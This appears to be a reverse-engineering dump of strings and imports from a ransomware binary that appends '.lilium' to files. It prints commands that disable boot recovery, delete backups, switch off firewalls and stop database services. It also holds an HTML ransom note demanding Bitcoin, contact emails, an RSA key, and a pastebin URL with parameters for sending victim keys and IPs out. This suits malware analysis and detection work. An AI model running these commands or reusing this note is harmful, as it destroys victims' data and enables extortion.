reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4056f7	0x51ccb0	string	0x405650	" not used
0x405faa	0x51cce4	string	0x405ef0	InputBuffer
0x40604c	0x51cce4	string	0x405ef0	InputBuffer
0x406402	0x51cd54	string	0x4063a0	OutputFileNameWide
0x406421	0x51cd68	string	0x4063a0	OutputBinaryMode
0x406582	0x51cdd8	string	0x406540	CipherModeBase: feedback size cannot be specified for this cipher mode
0x406784	0x51cd9c	string	0x4066a0	DecodingLookupArray
0x406818	0x51cd90	string	0x4066a0	Log2Base
0x406a81	0x51ce24	string	0x406a50	/GCM
0x406e06	0x51cd7c	string	0x406e00	EncodingParameters
0x40720a	0x51cdb0	string	0x407080	InsertLineBreaks
0x407241	0x51cdc4	string	0x407080	MaxLineLength
0x407304	0x51ce50	string	0x407290	C:\\Windows\
0x4074cf	0x4074e5	string	0x407290	RQ蝂\n blocks=Basic Latin,CJK Unified Ideographs
0x40783b	0x51cd54	string	0x407290	OutputFileNameWide
0x40785d	0x51cd68	string	0x407290	OutputBinaryMode
0x40795e	0x51cd20	string	0x407290	InputFileNameWide
0x407994	0x51cd34	string	0x407290	InputBinaryMode
0x407af9	0x51ce80	string	0x407290	
0x408203	0x51ceb8	string	0x407290	Unhandled exception caught
0x408c19	0x51ce80	string	0x408a70	
0x409699	0x51ceb8	string	0x408a70	Unhandled exception caught
0x4098df	0x4fc0b8	import	0x409850	KERNEL32.dll.FindFirstFileW
0x4098f0	0x51cee4	string	0x409850	fuck
0x409d7c	0x51cf04	string	0x409850	IDk.txt
0x409d93	0x51cf14	string	0x409850	!INFO
0x409e13	0x51ce50	string	0x409850	C:\\Windows\
0x409f7f	0x4fc0e4	import	0x409850	KERNEL32.dll.lstrcmpW
0x409ff1	0x4fc0c0	import	0x409850	KERNEL32.dll.FindNextFileW
0x40a005	0x4fc0cc	import	0x409850	KERNEL32.dll.FindClose
0x40a37f	0x4fc0b8	import	0x40a2f0	KERNEL32.dll.FindFirstFileW
0x40a390	0x51cee4	string	0x40a2f0	fuck
0x40a871	0x51ce50	string	0x40a2f0	C:\\Windows\
0x40a9f0	0x51cf2c	string	0x40a2f0	threaad
0x40aa23	0x51cf2c	string	0x40a2f0	threaad
0x40aa46	0x4fc0e4	import	0x40a2f0	KERNEL32.dll.lstrcmpW
0x40aab8	0x4fc0c0	import	0x40a2f0	KERNEL32.dll.FindNextFileW
0x40aacc	0x4fc0cc	import	0x40a2f0	KERNEL32.dll.FindClose
0x40ae4f	0x4fc0b8	import	0x40adc0	KERNEL32.dll.FindFirstFileW
0x40ae60	0x51cee4	string	0x40adc0	fuck
0x40b341	0x51ce50	string	0x40adc0	C:\\Windows\
0x40b4ad	0x4fc0e4	import	0x40adc0	KERNEL32.dll.lstrcmpW
0x40b51f	0x4fc0c0	import	0x40adc0	KERNEL32.dll.FindNextFileW
0x40b533	0x4fc0cc	import	0x40adc0	KERNEL32.dll.FindClose
0x40b8af	0x4fc0b8	import	0x40b820	KERNEL32.dll.FindFirstFileW
0x40b8c0	0x51cee4	string	0x40b820	fuck
0x40bda1	0x51ce50	string	0x40b820	C:\\Windows\
0x40bf0d	0x4fc0e4	import	0x40b820	KERNEL32.dll.lstrcmpW
0x40bf7f	0x4fc0c0	import	0x40b820	KERNEL32.dll.FindNextFileW
0x40bf93	0x4fc0cc	import	0x40b820	KERNEL32.dll.FindClose
0x40c30f	0x4fc0b8	import	0x40c280	KERNEL32.dll.FindFirstFileW
0x40c320	0x51cee4	string	0x40c280	fuck
0x40c74d	0x51ce50	string	0x40c280	C:\\Windows\
0x40c8a8	0x4fc0e4	import	0x40c280	KERNEL32.dll.lstrcmpW
0x40c91a	0x4fc0c0	import	0x40c280	KERNEL32.dll.FindNextFileW
0x40c92e	0x4fc0cc	import	0x40c280	KERNEL32.dll.FindClose
0x40ccaf	0x4fc0b8	import	0x40cc20	KERNEL32.dll.FindFirstFileW
0x40ccc0	0x51cee4	string	0x40cc20	fuck
0x40d1a1	0x51ce50	string	0x40cc20	C:\\Windows\
0x40d2fc	0x4fc0e4	import	0x40cc20	KERNEL32.dll.lstrcmpW
0x40d36e	0x4fc0c0	import	0x40cc20	KERNEL32.dll.FindNextFileW
0x40d382	0x4fc0cc	import	0x40cc20	KERNEL32.dll.FindClose
0x40d6ff	0x4fc0b8	import	0x40d670	KERNEL32.dll.FindFirstFileW
0x40d710	0x51cee4	string	0x40d670	fuck
0x40dbe4	0x51ce50	string	0x40d670	C:\\Windows\
0x40dd3f	0x4fc0e4	import	0x40d670	KERNEL32.dll.lstrcmpW
0x40ddb1	0x4fc0c0	import	0x40d670	KERNEL32.dll.FindNextFileW
0x40ddc5	0x4fc0cc	import	0x40d670	KERNEL32.dll.FindClose
0x40e0fd	0x4fc0b4	import	0x40e0b0	KERNEL32.dll.GetLogicalDrives
0x40e220	0x51cf34	string	0x40e1f0	sqlserver.exe
0x40e25a	0x51cf44	string	0x40e1f0	msftesql.exe
0x40e28b	0x51cf54	string	0x40e1f0	sqlagent.exe
0x40e2bc	0x51cf64	string	0x40e1f0	sqlbrowser.exe
0x40e2ed	0x51cf74	string	0x40e1f0	sqlwriter.exe
0x40e315	0x51cf84	string	0x40e1f0	mysqld.exe
0x40e33a	0x51cf90	string	0x40e1f0	mysqld-nt.exe
0x40e35f	0x51cfa0	string	0x40e1f0	mysqld-opt.exe
0x40e39c	0x4fc0dc	import	0x40e1f0	KERNEL32.dll.CloseHandle
0x40e3b4	0x4fc0d4	import	0x40e1f0	KERNEL32.dll.CreateToolhelp32Snapshot
0x40e3ce	0x4fc0bc	import	0x40e1f0	KERNEL32.dll.Process32First
0x40e41a	0x4fc0d0	import	0x40e1f0	KERNEL32.dll.OpenProcess
0x40e429	0x4fc0c4	import	0x40e1f0	KERNEL32.dll.TerminateProcess
0x40e430	0x4fc0dc	import	0x40e1f0	KERNEL32.dll.CloseHandle
0x40e43a	0x4fc0dc	import	0x40e1f0	KERNEL32.dll.CloseHandle
0x40e448	0x4fc0d8	import	0x40e1f0	KERNEL32.dll.Process32Next
0x40e526	0x4fc0b8	import	0x40e4a0	KERNEL32.dll.FindFirstFileW
0x40e75a	0x4fc0e4	import	0x40e4a0	KERNEL32.dll.lstrcmpW
0x40e78c	0x51cfb4	string	0x40e4a0	\!INFO.HTA
0x40e96a	0x4fc0c0	import	0x40e4a0	KERNEL32.dll.FindNextFileW
0x40e984	0x4fc0cc	import	0x40e4a0	KERNEL32.dll.FindClose
0x40ecef	0x4fc0b8	import	0x40ec60	KERNEL32.dll.FindFirstFileW
0x40ed00	0x51cee4	string	0x40ec60	fuck
0x40f199	0x51cf04	string	0x40ec60	IDk.txt
0x40f1b0	0x51cf14	string	0x40ec60	!INFO
0x40f219	0x51ce50	string	0x40ec60	C:\\Windows\
0x40f385	0x4fc0e4	import	0x40ec60	KERNEL32.dll.lstrcmpW
0x40f3f7	0x4fc0c0	import	0x40ec60	KERNEL32.dll.FindNextFileW
0x40f40b	0x4fc0cc	import	0x40ec60	KERNEL32.dll.FindClose
0x40f78f	0x4fc0b8	import	0x40f700	KERNEL32.dll.FindFirstFileW
0x40f7a0	0x51cee4	string	0x40f700	fuck
0x40fbc2	0x51ce50	string	0x40f700	C:\\Windows\
0x40fd18	0x4fc0e4	import	0x40f700	KERNEL32.dll.lstrcmpW
0x40fd8a	0x4fc0c0	import	0x40f700	KERNEL32.dll.FindNextFileW
0x40fd9e	0x4fc0cc	import	0x40f700	KERNEL32.dll.FindClose
0x4101a3	0x51d054	string	0x4100f0	active
0x4101b9	0x51d05c	string	0x4100f0	detive
0x41024f	0x51d074	string	0x4100f0	ID =
0x41026e	0x51d06c	string	0x4100f0	Disk:
0x4102df	0x51d064	string	0x4100f0	RSA:
0x41054e	0x51d07c	string	0x4100f0	https://pastebin.com/raw/E1MURCfS
0x410710	0x51d05c	string	0x4100f0	detive
0x410aab	0x51d0a8	string	0x4100f0	/1614CEEEC50A9336EBF690886CAA747D6811C45D37086A3FA7B11C9E83926C6C
0x410b72	0x51d0f0	string	0x4100f0	From
0x410c5f	0x51d120	string	0x4100f0	&ip=
0x410cad	0x51d118	string	0x4100f0	&disk=
0x410d4f	0x51d108	string	0x4100f0	&key=
0x410df2	0x51d100	string	0x4100f0	&id=
0x410e8d	0x51d0f8	string	0x4100f0	&mail=
0x4112fe	0x51d128	string	0x4100f0	Active
0x411618	0x51d05c	string	0x4100f0	detive
0x411a23	0x51d134	string	0x411990	C:\ProgramData\IDk.txt
0x411a67	0x51d14c	string	0x411990	C:\ProgramData\pubk.txt
0x411c4d	0x51d14c	string	0x411990	C:\ProgramData\pubk.txt
0x411c68	0x51cd10	string	0x411990	InputFileName
0x411c9b	0x51cd34	string	0x411990	InputBinaryMode
0x411dfa	0x51d164	string	0x411990	C:\ProgramData
0x411e8e	0x51d164	string	0x411990	C:\ProgramData
0x411f23	0x51cfd0	string	0x411990	0123456789QWERTYUIOPASDFGHJKLZXCVBNM
0x41206a	0x51d134	string	0x411990	C:\ProgramData\IDk.txt
0x41249b	0x51d14c	string	0x411990	C:\ProgramData\pubk.txt
0x4124ca	0x51cd44	string	0x411990	OutputFileName
0x4124e9	0x51cd68	string	0x411990	OutputBinaryMode
0x4125a6	0x51d054	string	0x411990	active
0x4125c4	0x51d14c	string	0x411990	C:\ProgramData\pubk.txt
0x412647	0x51d14c	string	0x411990	C:\ProgramData\pubk.txt
0x412659	0x51d178	string	0x411990	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEApTk8p79zDNC4E2Ah4kNtKg+Z1UahfP9esnedbBkLS9wwhMvBNF76CyZMovk5iJ1eEVAQ5WUtiZ5EhJEN9e4L15HH38rWaWpcwnn9Ww11+J2q/r7SwPiLTs4Qc6M/8Wh/Mikpo4XN70GRU6AKM6CZ4zWphnVXSfydoobkpPo7IdIKWYXKPIIFuJQe9Ieyz5ybrtOHCqQqB4yyTbq1z2PJxApTCZ2UEFJNBq0anWRx+oy1SUFkMppg+2ha+Mc5Ywab2/ftAkMzc+ExM79U7mQXtRyhxRjtb745IZaJqC++nIkWicLkcOSMWHYkAgA3sP8j3ECX5FthM4Bzfm8pI2MPJwIBEQ==
0x412679	0x51d14c	string	0x411990	C:\ProgramData\pubk.txt
0x41275f	0x51d178	string	0x411990	MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEApTk8p79zDNC4E2Ah4kNtKg+Z1UahfP9esnedbBkLS9wwhMvBNF76CyZMovk5iJ1eEVAQ5WUtiZ5EhJEN9e4L15HH38rWaWpcwnn9Ww11+J2q/r7SwPiLTs4Qc6M/8Wh/Mikpo4XN70GRU6AKM6CZ4zWphnVXSfydoobkpPo7IdIKWYXKPIIFuJQe9Ieyz5ybrtOHCqQqB4yyTbq1z2PJxApTCZ2UEFJNBq0anWRx+oy1SUFkMppg+2ha+Mc5Ywab2/ftAkMzc+ExM79U7mQXtRyhxRjtb745IZaJqC++nIkWicLkcOSMWHYkAgA3sP8j3ECX5FthM4Bzfm8pI2MPJwIBEQ==
0x41277f	0x51d14c	string	0x411990	C:\ProgramData\pubk.txt
0x412f2a	0x4fc0e0	import	0x412ee0	KERNEL32.dll.FreeConsole
0x412f71	0x51d320	string	0x412ee0	Open_file@tutanota.com
0x412f96	0x51d338	string	0x412ee0	Decrypt.lilium@gmail.com
0x412fbd	0x51d36c	string	0x412ee0	.lilium
0x413059	0x51d374	string	0x412ee0	net stop MSDTC
0x413063	0x51d384	string	0x412ee0	bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x41306d	0x51d3c0	string	0x412ee0	bcdedit /set {default} recoveryenabled no
0x413077	0x51d3ec	string	0x412ee0	wbadmin delete catalog -quiet
0x413081	0x51d40c	string	0x412ee0	net stop SQLSERVERAGENT
0x41308b	0x51d424	string	0x412ee0	net stop MSSQLSERVER
0x413095	0x51d43c	string	0x412ee0	net stop vds
0x41309f	0x51d44c	string	0x412ee0	netsh advfirewall set currentprofile state off
0x4130a9	0x51d47c	string	0x412ee0	netsh firewall set opmode mode=disable
0x4130b3	0x51d55c	string	0x412ee0	net stop SQLWriter
0x4130bd	0x51d570	string	0x412ee0	net stop SQLBrowser
0x4130c7	0x51d424	string	0x412ee0	net stop MSSQLSERVER
0x4130d1	0x51d584	string	0x412ee0	net stop MSSQL$CONTOSO1
0x413151	0x4fc0c8	import	0x412ee0	KERNEL32.dll.GetDriveTypeA
0x4132d3	0x4afa80	string	0x412ee0	WVS3
0x4132e1	0x4afa80	string	0x412ee0	WVS3
0x413330	0x51cff8	string	0x412ee0	0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM
0x41358a	0x51d638	string	0x412ee0	<html><head> <meta http-equiv='X-UA-Compatible' content='IE=8' /> <script type='text/javascript'> window.resizeTo(window.screen.width,window.screen.height);</script> <style> ol > li { display: table-row; }h1{ text-align: center; padding-top: 30px; background-color: red; width: 900px; margin: 0 auto; padding-bottom: 20px; border-radius: 15px; margin-top: 10px;}#d2{ text-align: center; background-color: red; width: 900px; margin: 0 auto; margin-top: 20px; padding-top: 20px; padding-bottom: 20px; border-radius: 15px; font-size: 15pt; font-family: Arial; font-weight: bolder;}body{ background-color: #d5d5d5; background-image: url('https://www.kaspersky.com/content/en-global/images/repository/isc/2017-images/encryption.jpg'); background-size: cover;} #d1{ text-align: center;margin:0 auto; margin-top: 20px; padding-top: 20px; padding-bottom: 20px; background-color: #cd5b5b; width: 900px; font-size: 15pt; font-family: Arial; font-weight: bolder; border-radius: 10px; } #img{ display: block; width: 100px; height: 100px; text-align: center; margin:0 auto; } </style> <title>lock</title></head><body><img src='https://www.iconsdb.com/icons/preview/red/lock-xxl.png' id='img' ><h1 id='h1'> !!! Your Files Has Been Encrypted !!!</h1><div id='d1'> &#9830; your files has been locked with highest secure cryptography algorithm &#9830; <br> &#9830; there is no way to decrypt your files without paying and buying Decryption tool&#9830; <br>&#9830; but after 48 hour decryption price will be double&#9830; <br>&#9830; you can send some little files for decryption test&#9830;<br> &#9830; test file should not contain valuable data&#9830;<br> &#9830; after payment you will get decryption tool ( payment Should be with Bit
0x4135bd	0x51d608	string	0x412ee0	<br/>our Email :
0x413683	0x51d5c8	string	0x412ee0	<br/>In Case Of No Answer :
0x41374d	0x51d59c	string	0x412ee0	</div> </body></html>
0x4137af	0x4137c5	string	0x412ee0	RQ轿\t blocks=Basic Latin,CJK Unified Ideographs
0x4138d2	0x4138e8	string	0x412ee0	RQ蚾\t blocks=Basic Latin,CJK Unified Ideographs
0x4139fc	0x4fc0c8	import	0x412ee0	KERNEL32.dll.GetDriveTypeA
0x413f2a	0x51ceb8	string	0x412ee0	Unhandled exception caught
0x413f79	0x4fc0c8	import	0x412ee0	KERNEL32.dll.GetDriveTypeA
0x4141e8	0x4fc0c8	import	0x412ee0	KERNEL32.dll.GetDriveTypeA
0x4144c8	0x4144de	string	0x412ee0	RQ褲\t blocks=Basic Latin,CJK Unified Ideographs
0x4146b0	0x4146c6	string	0x412ee0	RQ輰\t blocks=Basic Latin,CJK Unified Ideographs
0x4147d5	0x4147eb	string	0x412ee0	RQ藯\t blocks=Basic Latin,CJK Unified Ideographs
0x41481c	0x51ca64	string	0x412ee0	space
0x4148e0	0x51d308	string	0x412ee0	Unhandled exception\n
0x414e67	0x414e72	string	0x414df0	3ɉN`Ɔ blocks=Basic Latin,Latin Extended-B
0x415778	0x415789	string	0x415730	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41577e	0x415789	string	0x415730	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41583b	0x51ccf0	string	0x415830	SHA-1
0x4159c7	0x51e804	string	0x415990	OutputStringPointer
0x4166b7	0x4166c9	string	0x416600	3ۋE\b blocks=Basic Latin,Arabic
0x416d93	0x416d97	string	0x416d70	WPRQ
0x417225	0x4d2d22	string	0x417190	j\fh\b
0x41737f	0x4173f4	string	0x417190	RQ莃\t blocks=Basic Latin,CJK Unified Ideographs
0x417395	0x4173f4	string	0x417190	RQ莃\t blocks=Basic Latin,CJK Unified Ideographs
0x417884	0x4178b9	string	0x4177e0	;N\fs
0x418172	0x51d134	string	0x4180c0	C:\ProgramData\IDk.txt
0x4191f4	0x4191ff	string	0x4191a0	3ɉN` blocks=Basic Latin,Latin Extended-B
0x419d0a	0x419d1b	string	0x419ce0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x419d10	0x419d1b	string	0x419ce0	3ɉO` blocks=Basic Latin,Latin Extended-B
0x41ab23	0x51e8a4	string	0x41aaf0	BufferedTransformation: this object doesn't allow input
0x41ac83	0x51e8a4	string	0x41ac50	BufferedTransformation: this object doesn't allow input
0x41c211	0x41c200	string	0x41c170	;B\bu
0x41c340	0x51e8dc	string	0x41c340	vector<T> too long
0x41cf5d	0x51ce2c	string	0x41cf10	MGF1
0x41cfe2	0x51ccf0	string	0x41cf10	SHA-1
0x41d200	0x51e948	string	0x41d200	invalid string position
0x41d7c8	0x41d7b8	string	0x41d7a0	;P\bu\r
0x41dc51	0x41dd07	string	0x41dc40	_^[]
0x41e96b	0x51ccf8	string	0x41e930	FeedbackSize
0x41f081	0x51cf20	string	0x41ef50	shit
0x421090	0x51e960	string	0x421090	string too long
0x4216e7	0x51c998	string	0x4215e0	false
0x421700	0x51c9a0	string	0x4215e0	true
0x423161	0x423130	string	0x4230f0	;}\ftAf
0x423174	0x423130	string	0x4230f0	;}\ftAf
0x4237a4	0x4fc354	import	0x423780	WS2_32.dll.socket
0x4237b5	0x4fc588	string	0x423780	Failed to create socket
0x42380b	0x4fc358	import	0x423780	WS2_32.dll.setsockopt
0x423816	0x4fc5a0	string	0x423780	all your TCP packets will be buffered
0x42381b	0x4fc5c8	string	0x423780	Failed to set socket option "TCP_NODELAY" ;
0x423838	0x4fc358	import	0x423780	WS2_32.dll.setsockopt
0x423843	0x4fc5f8	string	0x423780	Failed to enable broadcast on UDP socket
0x4239d9	0x4fc3b0	import	0x4239d0	WS2_32.dll.htonl
0x423a67	0x4fc624	string	0x423a30	www.sfml-dev.org
0x423ac5	0x423adb	string	0x423a30	RQ觼\b blocks=Basic Latin,CJK Unified Ideographs
0x423b2f	0x4fc638	string	0x423a30	/ip-provider.php
0x42401d	0x4fc64c	string	0x424010	255.255.255.255
0x42404b	0x4fc65c	string	0x424010	0.0.0.0
0x424068	0x4fc344	import	0x424010	WS2_32.dll.inet_addr
0x4240ad	0x4fc338	import	0x424010	WS2_32.dll.getaddrinfo
0x4240c5	0x4fc360	import	0x424010	WS2_32.dll.freeaddrinfo
0x4240e2	0x4fc33c	import	0x4240e0	WS2_32.dll.ntohl
0x4240f7	0x4fc340	import	0x4240f0	WS2_32.dll.inet_ntoa
0x424981	0x4249ff	string	0x4246b0	QR胭\b blocks=Basic Latin,CJK Unified Ideographs
0x424997	0x4249ff	string	0x4246b0	QR胭\b blocks=Basic Latin,CJK Unified Ideographs
0x42513e	0x425150	string	0x4250d0	_^[]
0x425b8b	0x425bc0	string	0x425ac0	;K\fs
0x4269db	0x51c998	string	0x4268e0	false
0x426a09	0x51c9a0	string	0x4268e0	true
0x426b96	0x4fc8dc	string	0x426a70	0123456789-+Ee
0x42780d	0x4fc908	string	0x427710	0123456789ABCDEFabcdef-+XxPp
0x428466	0x4fc8ec	string	0x4283e0	0123456789ABCDEFabcdef-+Xx
0x42ac5f	0x4fc754	string	0x42abb0	http/
0x42ad83	0x4fc764	string	0x42abb0	transfer-encoding
0x42aea4	0x4fc75c	string	0x42abb0	chunked
0x42b9d5	0x4fc714	string	0x42b8d0	POST
0x42b9de	0x4fc71c	string	0x42b8d0	HEAD
0x42b9f0	0x4fc728	string	0x42b8d0	DELETE
0x42ba63	0x4fc734	string	0x42b8d0	HTTP/
0x42bb11	0x42bb03	string	0x42b8d0	;p\bu\v
0x42bfd7	0x51d0f0	string	0x42be60	From
0x42c078	0x4fc7b8	string	0x42be60	user@sfml-dev.org
0x42c0a5	0x51d0f0	string	0x42be60	From
0x42c16f	0x4fc7cc	string	0x42be60	User-Agent
0x42c209	0x4fc7d8	string	0x42be60	libsfml-network/2.x
0x42c236	0x4fc7cc	string	0x42be60	User-Agent
0x42c300	0x4fc7ec	string	0x42be60	Host
0x42c39a	0x4fc7ec	string	0x42be60	Host
0x42c42d	0x4fc7f4	string	0x42be60	Content-Length
0x42c565	0x4fc7f4	string	0x42be60	Content-Length
0x42c66e	0x4fc804	string	0x42be60	Content-Type
0x42c728	0x4fc814	string	0x42be60	application/x-www-form-urlencoded
0x42c755	0x4fc804	string	0x42be60	Content-Type
0x42c836	0x4fc838	string	0x42be60	Connection
0x42c8f0	0x4fc844	string	0x42be60	close
0x42c91d	0x4fc838	string	0x42be60	Connection
0x42cd55	0x4fc778	string	0x42cd20	http://
0x42ce6f	0x4fc780	string	0x42cd20	https://
0x42ceff	0x4fc78c	string	0x42cd20	HTTPS protocol is not supported by sf::Http
0x42d266	0x4fc348	import	0x42d260	WS2_32.dll.closesocket
0x42d280	0x4fc3b0	import	0x42d270	WS2_32.dll.htonl
0x42d294	0x4fc368	import	0x42d270	WS2_32.dll.htons
0x42d2b0	0x4fc374	import	0x42d2b0	WS2_32.dll.WSAGetLastError
0x42d329	0x4fc364	import	0x42d310	WS2_32.dll.ioctlsocket
0x42d573	0x4fc350	import	0x42d4a0	WS2_32.dll.connect
0x42d5be	0x4fc350	import	0x42d4a0	WS2_32.dll.connect
0x42d630	0x4afa80	string	0x42d4a0	WVS3
0x42d672	0x4fc384	import	0x42d4a0	WS2_32.dll.select
0x42d6af	0x4fc378	import	0x42d4a0	WS2_32.dll.getpeername
0x42d6bd	0x4fc33c	import	0x42d4a0	WS2_32.dll.ntohl
0x42d7c4	0x4fc9c0	string	0x42d7b0	Cannot receive data from the network (the destination buffer is invalid)
0x42d7f3	0x4fc380	import	0x42d7b0	WS2_32.dll.recv
0x42d830	0x4fc950	string	0x42d820	Warning: Partial sends might not be handled properly.
0x42d8a8	0x4fc388	import	0x42d870	WS2_32.dll.send
0x42d8e7	0x4fc988	string	0x42d870	Cannot send data over the network (no data to send)
0x42d962	0x42d966	string	0x42d950	SVW3۾@ blocks=Basic Latin,Arabic
0x42dbe6	0x4fca3c	string	0x42dbb0	BER decode error
0x42e024	0x42e08a	string	0x42df30	_^][
0x42e9b9	0x42ea6a	string	0x42e9a0	_^]2
0x42ea3d	0x42ea6a	string	0x42e9a0	_^]2
0x42f1df	0x42dc90	string	0x42f1a0	SVWj
0x42f94e	0x4fce94	string	0x42f920	PK_Signer: key too short for this signature scheme
0x4312cf	0x4fd38c	string	0x431210	is not a valid key length
0x431564	0x4fd350	string	0x4314e0	: this object doesn't support multiple channels
0x43193b	0x431945	string	0x4318b0	2҈T$,; blocks=Basic Latin,Cyrillic
0x43193f	0x431945	string	0x4318b0	2҈T$,; blocks=Basic Latin,Cyrillic
0x432058	0x4fd6a0	string	0x432030	NullRNG: NullRNG should only be passed to functions that don't need to generate random bytes
0x432545	0x4fd57c	string	0x4323d0	: this object requires an IV
0x4326b8	0x4fd314	string	0x432690	BufferedTransformation: this object can't be reinitialized
0x432a32	0x4fd5f0	string	0x4329b0	: this object doesn't support a special last block
0x43344e	0x4fd638	string	0x433350	: message length
0x433476	0x4fd288	string	0x433350	exceeds the maximum of
0x43351b	0x4fd64c	string	0x433350	: footer length
0x43353d	0x4fd288	string	0x433350	exceeds the maximum of
0x433b61	0x433ba0	string	0x433af0	_^][
0x433b94	0x433ba0	string	0x433af0	_^][
0x433c04	0x433ba0	string	0x433af0	_^][
0x433d05	0x433d57	string	0x433c70	_^][
0x4343ef	0x51cd9c	string	0x4343b0	DecodingLookupArray
0x43440a	0x51cd90	string	0x4343b0	Log2Base
0x4344a6	0x51cdb0	string	0x434470	InsertLineBreaks
0x4344d2	0x51cdc4	string	0x434470	MaxLineLength
0x4344f5	0x4fd970	string	0x434470	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
0x43456c	0x4fe23c	string	0x434470	EncodingLookupArray
0x43457f	0x4fe230	string	0x434470	PaddingByte
0x434598	0x4fe224	string	0x434470	GroupSize
0x4345ad	0x4fe20c	string	0x434470	Separator
0x4345c2	0x4fe218	string	0x434470	Terminator
0x4345d4	0x51cd90	string	0x434470	Log2Base
0x434d00	0x434d17	string	0x434ce0	3҉VX blocks=Basic Latin,Cyrillic
0x434d06	0x434d17	string	0x434ce0	3҉VX blocks=Basic Latin,Cyrillic
0x434ed3	0x434ee7	string	0x434ea0	QW蛨\a blocks=Basic Latin,CJK Unified Ideographs
0x435928	0x4fe998	string	0x435900	PK_MessageEncodingMethod: this signature scheme does not support message recovery
0x436238	0x4fe2bc	string	0x436210	PK_MessageAccumulator: DigestSize() should not be called
0x437106	0x4395e0	string	0x436e20	SUVW
0x437151	0x4394a0	string	0x436e20	SUVW
0x437330	0x437320	string	0x436e20	;} sbG
0x437335	0x4395e0	string	0x436e20	SUVW
0x437380	0x4394a0	string	0x436e20	SUVW
0x437668	0x4fe2f8	string	0x437640	PK_MessageAccumulator: TruncatedFinal() should not be called
0x4380cb	0x4380fb	string	0x438020	_^][
0x4380d0	0x4380fb	string	0x438020	_^][
0x43839e	0x4fed40	string	0x438370	Integer: division by zero
0x4389de	0x4fed5c	string	0x4389b0	Integer: no integer satisfies the given parameters
0x438afe	0x51cce4	string	0x438a80	InputBuffer
0x438d54	0x4395e0	string	0x438d10	SUVW
0x4398c8	0x4394a0	string	0x439850	SUVW
0x43992b	0x4394a0	string	0x439850	SUVW
0x439961	0x439540	string	0x439850	SUVW
0x439b2c	0x439540	string	0x439a10	SUVW
0x439e0d	0x439e3e	string	0x439b50	3\vt$
0x439eed	0x439f01	string	0x439b50	_^]3
0x43a0d8	0x43a183	string	0x43a060	3ҋl$$ blocks=Basic Latin,Cyrillic
0x43a0e2	0x43a183	string	0x43a060	3ҋl$$ blocks=Basic Latin,Cyrillic
0x43a16d	0x43a37b	string	0x43a060	][_^
0x43a353	0x43a37b	string	0x43a060	][_^
